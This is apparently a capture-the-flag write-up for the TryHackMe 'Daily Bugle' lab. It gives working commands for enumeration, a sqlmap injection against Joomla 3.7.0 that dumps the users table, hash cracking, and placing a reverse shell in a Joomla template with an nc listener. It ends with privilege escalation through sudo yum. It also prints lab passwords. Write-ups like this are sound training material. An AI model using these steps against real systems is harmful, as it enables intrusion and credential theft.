---
layout: post
permalink: /posts/thm/daily-bugle
title: "Daily Bugle"
---

Scan the target machine with nmap

```
nmap -sC -sV <ip>
```

![nmap-scan](/assets/images/thm/daily-bugle/nmap-scan.png)

There are 3 open ports: 22, 80 and 3306. Visit the website

![website](/assets/images/thm/daily-bugle/website.png)

Wow.. Spider-man is accused of robbery. We don't have any additional imformation. Let's scan the target with Gobuster.

![gobuster](/assets/images/thm/daily-bugle/gobuster.png)

We have found that there is /administrator page.

![login-form](/assets/images/thm/daily-bugle/login-form.png)

We know the web site uses CMS Joomla. Let's use joomlascan.

```
/opt/joomscan/joomscan.pl -u http://10.10.255.36
```

![joomla-version](/assets/images/thm/daily-bugle/joomla-version.png)

We find out the Joomla version. Now we are going to use searchsploit to find a vlunerability for this version.

```
searchsploit joomla 3.7.0
```

![searchsploit](/assets/images/thm/daily-bugle/searchsploit.png)

![searchsploit-view](/assets/images/thm/daily-bugle/searchsploit-view.png)

This exploit shows us that we are going to use sqlmap

```
sqlmap -u "http://10.10.255.36/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

![sqlmap1](/assets/images/thm/daily-bugle/sqlmap1.png)

Let's try to find the credentials in joomla. We can find the table name in the joomla documentations: https://docs.joomla.org/Tables/users

![joomla-table](/assets/images/thm/daily-bugle/joomla-table.png)

```
sqlmap -u "http://10.10.255.36/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump
```

![sqlmap2](/assets/images/thm/daily-bugle/sqlmap2.png)

It looks we need to add the columns. Stop the scan, we have already had them from the documentation.

```
sqlmap -u "http://10.10.255.36/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C id,name,username,email,password,usertype,block,sendEmail,registerDate,lastvisitDate,activation,params --dump
```

We found the user jonah and his hashed password. We are going to use https://hashcat.net/wiki/doku.php?id=example_hashes to identify the hash and John the Ripper to crack it.

![hash-code](/assets/images/thm/daily-bugle/hash-code.png)

```
john hash.txt --wordlist=rockyou.txt --format=bcrypt
```

![john-result](/assets/images/thm/daily-bugle/john-result.png)

We were able to log in /administrator directory with jonah:spiderman123
The web interface confirms that jonah is a superuser of the joomla installation.

![super-user](/assets/images/thm/daily-bugle/super-user.png)

This means we can edit the template used by the blog.

On the top menu go to Extensions -> Templates -> Templates

![templates](/assets/images/thm/daily-bugle/templates.png)

Now create new file

![create-file](/assets/images/thm/daily-bugle/create-file.png)

Paste monkeyReverseShell in it and start listener

```
nc -lvnp 1234
```

go to

![url](/assets/images/thm/daily-bugle/url.png)

![shell](/assets/images/thm/daily-bugle/shell.png)

Stabalize shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

We are going to use linpeas

```
cd /dev/shm
```

![download](/assets/images/thm/daily-bugle/download.png)

```
./linpeas.sh
```

![linpeas](/assets/images/thm/daily-bugle/linpeas.png)

Linpeas found clear text password and we had found username jjameson in /home. Let's try to ssh with this password nv5uz9r3ZEDzVjNu

![ssh](/assets/images/thm/daily-bugle/ssh.png)

Let's find out if jjameson is allowed to do something as another user

![sudo-l](/assets/images/thm/daily-bugle/sudo-l.png)

go to https://gtfobins.github.io/gtfobins/yum/#sudo

![gtfo](/assets/images/thm/daily-bugle/gtfo.png)

Simply copy and paste the example code from gtfobin

![poc](/assets/images/thm/daily-bugle/poc.png)
